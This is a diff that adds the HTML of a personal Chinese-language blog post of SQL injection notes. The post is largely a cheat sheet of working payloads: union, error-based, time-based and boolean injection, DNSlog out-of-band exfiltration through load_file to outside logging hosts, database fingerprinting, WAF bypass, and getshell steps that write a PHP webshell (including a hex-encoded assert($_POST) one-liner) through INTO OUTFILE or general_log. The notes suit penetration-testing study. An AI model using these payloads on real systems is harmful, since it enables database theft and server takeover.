@@ -1,0 +1,938 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="9Uqdk6WBttaW2iVEZWNVyCsRscTnIN0PddwPIO3LnJ0" />
+<meta name="baidu-site-verification" content="code-oUsBMQlUt5" />
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="true" />
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="true" />
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="SQL注入," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x01 常见注入类型一、带回显1. 联合注入12345678910111213id&#x3D;1&amp;#x27; and 1&#x3D;1--+   &#x3D;&#x3D;&gt;   id&#x3D;1&amp;#x27; and 1^0--+   &#x3D;&#x3D;&gt;  select !0id&#x3D;1&amp;#x27; and 1&#x3D;2--+   &#x3D;&#x3D;&gt;   id&#x3D;1&amp;#x27; and 1^1--+   &#x3D;&#x3D;&gt;1&amp;#x27; and &amp;#x27;1&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入笔记">
+<meta property="og:url" content="https://xhycccc.github.io/2019/11/20/sql-injection/index.html">
+<meta property="og:site_name" content="欣海余诚&#39;s blog">
+<meta property="og:description" content="0x01 常见注入类型一、带回显1. 联合注入12345678910111213id&#x3D;1&amp;#x27; and 1&#x3D;1--+   &#x3D;&#x3D;&gt;   id&#x3D;1&amp;#x27; and 1^0--+   &#x3D;&#x3D;&gt;  select !0id&#x3D;1&amp;#x27; and 1&#x3D;2--+   &#x3D;&#x3D;&gt;   id&#x3D;1&amp;#x27; and 1^1--+   &#x3D;&#x3D;&gt;1&amp;#x27; and &amp;#x27;1&amp;#x2">
+<meta property="og:locale">
+<meta property="og:image" content="https://xhycccc.github.io/2019/11/20/sql-injection/sql_waf_bypass.jpg">
+<meta property="article:published_time" content="2019-11-20T07:05:44.000Z">
+<meta property="article:modified_time" content="2021-07-06T07:57:38.872Z">
+<meta property="article:author" content="欣海余诚">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xhycccc.github.io/2019/11/20/sql-injection/sql_waf_bypass.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://xhycccc.github.io/2019/11/20/sql-injection/"/>
+
+
+
+
+
+  <title>SQL注入笔记 | 欣海余诚's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband">
+<a target="_blank" rel="noopener" href="https://github.com/xhycccc" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    </div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">欣海余诚's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">习惯成自然</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-guestbook">
+          <a href="/guestbook/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-comment"></i> <br />
+            
+            留言
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2019/11/20/sql-injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欣海余诚's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-20T15:05:44+08:00">
+                2019-11-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x01-常见注入类型"><a href="#0x01-常见注入类型" class="headerlink" title="0x01 常见注入类型"></a>0x01 常见注入类型</h2><h3 id="一、带回显"><a href="#一、带回显" class="headerlink" title="一、带回显"></a>一、带回显</h3><h4 id="1-联合注入"><a href="#1-联合注入" class="headerlink" title="1. 联合注入"></a>1. 联合注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=1--+   ==&gt;   id=1&#x27; and 1^0--+   ==&gt;  select !0</span><br><span class="line">id=1&#x27; and 1=2--+   ==&gt;   id=1&#x27; and 1^1--+   ==&gt;</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27; --+</span><br><span class="line">1&#x27; order by 2 -- -</span><br><span class="line">1&#x27; union select 1,2-- -</span><br><span class="line">注表名</span><br><span class="line">1&#x27; union select database(), group_concat(table_name) from information_schema.tables where table_schema=database()-- -</span><br><span class="line">注列名：</span><br><span class="line">1&#x27; union select table_name, group_concat(column_name) from information_schema.columns where table_name=&#x27;xxx&#x27;-- -;</span><br><span class="line"> select !1</span><br><span class="line">//注flag：</span><br><span class="line">id=-1&#x27;%20union%20select%201,username,password%20from%20security.users--+</span><br></pre></td></tr></table></figure>
+<h4 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h4><ol>
+<li><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e097a1c0d9ef">双查询注入(Duplicate entry报错)</a></p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,count(*),concat_ws(&#x27;:&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand()*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p>
+</blockquote>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/158705.html">Xpath报错</a></p>
+<p> 条件：Mysql&gt;5.1.5</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//updatexml():对xml进行查询和修改</span><br><span class="line">id=1&#x27; and updatexml(1,concat(0x26,(version()),0x26),1)--+</span><br><span class="line">id=1&#x27; and updatexml(1,concat(0x3a,(select username from security.users limit 1)), 1)--+</span><br><span class="line">//extractvalue():对xml进行查询和修改</span><br><span class="line">id=1&#x27; and (extractvalue(1,concat(0x26,(version()),0x26)))--+</span><br><span class="line"></span><br><span class="line">1&#x27; and updatexml(0,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;),0)-- -</span><br><span class="line">1&#x27; and updatexml(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1)-- -</span><br><span class="line">1&#x27; and extractvalue(0,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;))-- -</span><br></pre></td></tr></table></figure>
+<p> 报错注入只能爆出32位，结合substring爆出64位flag</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.lsablog.com/networksec/penetration/error-based-blind-sqli/">整数溢出报错</a></p>
+<p> exp(x):计算e的x次方，需要Mysql&gt;5.5.5</p>
+<p> 原理：Exp()超过710会产生溢出。</p>
+<p> Payload: </p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (EXP(~(select * from(select version())a)))--+ //未试验成功</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="二、无回显"><a href="#二、无回显" class="headerlink" title="二、无回显"></a>二、无回显</h4><h4 id="1-基于时间"><a href="#1-基于时间" class="headerlink" title="1. 基于时间"></a>1. 基于时间</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cyjaysun/p/4463979.html">延迟函数</a></li>
+</ul>
+<ol>
+<li><p>Mssql：</p>
+<p> waitfor {DELAY ‘time’ | TIME ‘time’}, time格式为“时:分:秒”。（无sleep函数）</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; waitfor delay &#x27;0:0:5&#x27;;--+</span><br></pre></td></tr></table></figure></li>
+<li><p>Mysql：</p>
+<p> BENCHMARK将一个表达式执行许多次：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and(SELECT BENCHMARK(10000000,ENCODE(&#x27;hello&#x27;,&#x27;mom&#x27;))) and 1=1--+ //BENCHMARK(count, express)</span><br></pre></td></tr></table></figure>
+<p> sleep()函数：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and(select sleep(5)) and 1=1--+</span><br><span class="line">1&#x27; and if(LENGTH(DATABASE())=13,SLEEP(1),0);</span><br><span class="line">1&#x27; and if(ord(SUBSTRING(user(),1,1))=114,SLEEP(1),0);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Postgresql</p>
+<p> 最新版本的PostgreSQL数据库(8.2及以上版本)中，可以使用pg_sleep函数来引起延迟：<code>id=1&#39; and SELECT pg_sleep(10);--+</code></p>
+</li>
+<li><p>Oracle:</p>
+<p> DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以public权限执行该包。 </p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; or 1=dbms_pipe.receive_message(&#x27;RDS&#x27;, 10)--+ //</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="2-基于bool"><a href="#2-基于bool" class="headerlink" title="2. 基于bool"></a>2. 基于bool</h4><h4 id="3-DNSLOG带外"><a href="#3-DNSLOG带外" class="headerlink" title="3. DNSLOG带外"></a>3. DNSLOG带外</h4><p>mysql的secure_file_priv为空的时候可以使用,版本基本在5.5.53之前。(经测试，5.5.2也不能成功带外)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;////test.hcg10m.dnslog.cn//a.txt&quot;);</span><br><span class="line">select load_file(concat(&quot;////&quot;, version(), &quot;.8em7js.ceye.io//a.txt&quot;));</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-如何区分后端数据库"><a href="#0x02-如何区分后端数据库" class="headerlink" title="0x02 如何区分后端数据库"></a>0x02 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34275734/article/details/91816289">如何区分后端数据库</a></h2><h3 id="1-看报错"><a href="#1-看报错" class="headerlink" title="1. 看报错"></a>1. 看报错</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Oracle：</span><br><span class="line">ORA-00933: SQL command not properly ended</span><br><span class="line"></span><br><span class="line">MS SQL Server：</span><br><span class="line">Microsoft SQL Native Client error &#x27;80040e14&#x27;</span><br><span class="line">Unclosed quotation mark after the character string</span><br><span class="line"></span><br><span class="line">PostgreSQL：</span><br><span class="line">Query failed: ERROR: syntax error at or near &quot;&#x27;&quot; at character 56 in /www/site/test.php on line 121.</span><br></pre></td></tr></table></figure>
+<h3 id="2-通过各个数据库特有的数据表和环境变量来判断"><a href="#2-通过各个数据库特有的数据表和环境变量来判断" class="headerlink" title="2. 通过各个数据库特有的数据表和环境变量来判断"></a>2. 通过各个数据库特有的数据表和环境变量来判断</h3><ul>
+<li><p>Oracle:</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select count(*) from sys.user_tables)&gt;0 and 1=1</span><br></pre></td></tr></table></figure></li>
+<li><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1056134">Mssql </a></p>
+<ul>
+<li>特有的系统表</li>
+</ul>
+<p>  sysdatabases: 存储了所有的数据库，sysobjects存储了所有的数据库表。<code>select * from master.dbo.sysdatabases</code>就可以查询出所有的库名。 </p>
+<p>  Sysobjects：SQL-SERVER的每个数据库内都有此系统表，它存放该数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，每个对象在表中占一行。</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select count(*) from )&gt;0 and 1=1</span><br></pre></td></tr></table></figure>
+<p>  syscolumns：每个表和视图中的每列在表中占一行，存储过程中的每个参数在表中也占一行。该表位于每个数据库中。主要字段有：</p>
+<ul>
+<li>系统变量</li>
+</ul>
+<p>  SQL－SERVER有user,db_name(),@@VERSION等系统变量，利用这些系统值不仅可以判断SQL-SERVER，而且还可以得到大量有用信息。(无version()函数)</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abc.asp?p=YY and user&gt;0 不仅可以判断是否是SQL-SERVER，而还可以得到当前连接到数据库的用户名</span><br><span class="line"></span><br><span class="line">abc.asp?p=YY&amp;n ... db_name()&gt;0 不仅可以判断是否是SQL-SERVER，而还可以得到当前正在使用的数据库名；</span><br></pre></td></tr></table></figure></li>
+<li><p>Mysql:</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (select count(*) from information_schema.TABLES)&gt;0 and 1=1--+</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="3-通过各数据库特有的连接符判断数据库类型"><a href="#3-通过各数据库特有的连接符判断数据库类型" class="headerlink" title="3. 通过各数据库特有的连接符判断数据库类型"></a>3. 通过各数据库特有的连接符判断数据库类型</h3><ol>
+<li><p>mssql数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27; + &#x27;1&#x27; = &#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
+<li><p>mysql数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27; + &#x27;1&#x27; = &#x27;2&#x27;</span><br><span class="line">http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;1&#x27;,&#x27;1&#x27;)=&#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
+<li><p>oracle数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27;||&#x27;1&#x27;=&#x27;11&#x27;</span><br><span class="line">http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;1&#x27;,&#x27;1&#x27;)=&#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="0x03-注入位置"><a href="#0x03-注入位置" class="headerlink" title="0x03 注入位置"></a>0x03 注入位置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tables where id=[子查询] order by [子查询, PROCEDURE ANALYSE] limit [PROCEDURE ANALYSE, INTO...LINES TERMINATED BY]</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-limit注入"><a href="#1-limit注入" class="headerlink" title="1. limit注入"></a>1. limit注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql = &quot;SELECT id FROM test WHERE id &gt; 0 ORDER BY id LIMIT &quot;.$_GET[&#x27;num&#x27;];</span><br></pre></td></tr></table></figure>
+
+<p>limit注入分有无<code>order by</code>. 若无<code>order by</code>可以使用union select，存在<code>order by</code>可以使用<code>procedure analyse()</code>报错注入和<code>into outfile &#39;&#39; lines terminated by</code>写文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1 into outfile &#x27;D:\\phpstudy_pro\\WWW\\test123.php&#x27; LINES TERMINATED BY 0x3C3F7068702061737365727428245F504F53545B70765D293B3F3E</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>procedure analysis此方法只适用于小于5.6.6的5.x系列。into 需要有file权限</p>
+</blockquote>
+<h3 id="2-order-by注入"><a href="#2-order-by注入" class="headerlink" title="2. order by注入"></a>2. order by注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql = &quot;select * from test order by &quot;.$_GET[&#x27;order&#x27;];</span><br></pre></td></tr></table></figure>
+<p>order by后可直接跟子查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order=updatexml(1,concat(0x3a,user(),0x3a),1)</span><br><span class="line">order=updatexml(1,concat(0x3a,(select id from test limit 1),0x3a),1)</span><br><span class="line">extractvalue(1,concat(0x3a,user(),0x3a))</span><br></pre></td></tr></table></figure>
+<h3 id="3-表名注入"><a href="#3-表名注入" class="headerlink" title="3. 表名注入"></a>3. 表名注入</h3><p><code>show columns from $table</code>show的语法如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW [FULL] COLUMNS &#123;FROM | IN&#125; tbl_name [&#123;FROM | IN&#125; db_name]</span><br><span class="line">[LIKE &#x27;pattern&#x27; | WHERE expr]</span><br></pre></td></tr></table></figure>
+<p>后面可以直接跟where子查询：<code>SHOW COLUMNS FROM </code>test<code> WHERE UPDATEXML(1,user(),1);</code></p>
+<p>还有<code>describe $table</code>, <code>update $table</code>等。</p>
+<h2 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h2><h3 id="1-替换逗号"><a href="#1-替换逗号" class="headerlink" title="1. 替换逗号"></a>1. 替换逗号</h3><ol>
+<li><p>substring from…for</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,2)) -&gt; select ascii(substring(user() from 1 for 1))</span><br></pre></td></tr></table></figure></li>
+<li><p><code>like &#39;a%&#39;</code> 成功再测试 <code>like &#39;aa%&#39;</code>、 <code>like &#39;ab%&#39;</code> … <code>like &#39;az%&#39;</code> 直到第二个字符正确，再测试第三个。</p>
+</li>
+<li><p><code>select user() regexp &#39;^a&#39;</code></p>
+</li>
+</ol>
+<h3 id="2-符号替换"><a href="#2-符号替换" class="headerlink" title="2. 符号替换"></a>2. 符号替换</h3><p><img src="./sql_waf_bypass.jpg" alt="image"></p>
+<h3 id="3-sqlmap-tamper"><a href="#3-sqlmap-tamper" class="headerlink" title="3. sqlmap tamper"></a>3. sqlmap tamper</h3><blockquote>
+<p>过waf tamper相关<br><br>与burp联合，sqlmap4burp，gason，sqlipy</p>
+</blockquote>
+<h2 id="0x05-getshell"><a href="#0x05-getshell" class="headerlink" title="0x05 getshell"></a>0x05 getshell</h2><h3 id="1-注入写shell"><a href="#1-注入写shell" class="headerlink" title="1. 注入写shell"></a>1. 注入写shell</h3><p>mysql的secure_file_priv参数限制了的导入导出的文件权限，只能将文件导入或导出到指定位置（一般不能导出到web目录）。</p>
+<p>这个参数不能动态更改，只能在mysql的配置文件中进行修改，然后重启生效。</p>
+<blockquote>
+<p>show variables like ‘%secure%’. 其中当参数 secure_file_priv 为空时，对导入导出无限制<br><br>当值为一个指定的目录时，只能向指定的目录导入导出<br><br>当值被设置为NULL时，禁止导入导出功能</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#x27;&lt;?phpinfo();?&gt;&#x27; into dumpfile &#x27;D:\\test.php&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">注入payload：</span><br><span class="line">id=1&#x27; union select 1,&#x27;123&#x27; into dumpfile &#x27;D:/xxx/xxx/shell.php&#x27;-- -</span><br></pre></td></tr></table></figure>
+<ul>
+<li>dumpfile/outfile/load_file区别参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zztac/p/11371149.html">dumpfile/outfile/load_file</a></li>
+</ul>
+<h3 id="2-日志写shell"><a href="#2-日志写shell" class="headerlink" title="2. 日志写shell"></a>2. 日志写shell</h3><p>general_log</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;</span><br><span class="line"></span><br><span class="line">SET global general_log_file=&#x27;E:/UPUPW_AP5.6-1510/UPUPW_AP5.6/htdocs/classes.php&#x27;; </span><br><span class="line"></span><br><span class="line">SELECT &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/12/04/ssrf-referrence/" rel="prev" title="SSRF笔记">
